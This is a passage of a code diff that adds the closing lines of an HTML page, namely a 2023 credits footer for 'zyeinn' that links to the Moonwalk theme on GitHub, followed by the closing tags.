+        <div class="credits">&copy;&nbsp;2023&nbsp;zyeinn
+          &nbsp;
+          •
+          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
+        </div>
+      </div>
+    </main></body>
+</html>
